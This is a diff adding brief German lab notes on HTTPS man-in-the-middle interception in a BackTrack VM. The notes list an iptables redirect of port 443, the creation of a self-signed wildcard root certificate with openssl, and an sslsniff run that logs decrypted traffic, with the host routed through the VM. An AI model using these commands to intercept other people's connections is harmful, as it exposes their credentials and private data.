@@ -1,0 +1,23 @@
+In Backtrack:
+- Prüfen, ob Defaultroute auf Bridged Device
+- IP-Forwarding an
+- IP-Tables-Prerouting-Eintrag gemäß README:
+  iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10001
+- Self-signed root certificate generieren:
+  Schlüssel erzeugen:
+  openssl genrsa -des3 -out myroot-enc.key 1024
+  Passwort entfernen:
+  openssl rsa -in myroot-enc.key -out myroot.key
+  Certificate request erzeugen (Common name muß "*" sein):
+  openssl req -new -key myroot.key -out myroot.csr
+  Zertifikat erzeugen:
+  openssl x509 -req -days 365 -in myroot.csr -signkey myroot.key -out myroot.crt
+  Zertifikat und Schlüssel in selbe Datei:
+  cat myroot.crt myroot.key > myroot
+- sslsniff starten, Protokoll in Logdatei schreiben
+  sslsniff -a -c myroot -s 10001 -w log.txt
+In Hostsystem:
+- Defaultroute löschen
+- Defaultroute auf Host-Only-Interface setzen
+- Profit :-)
+
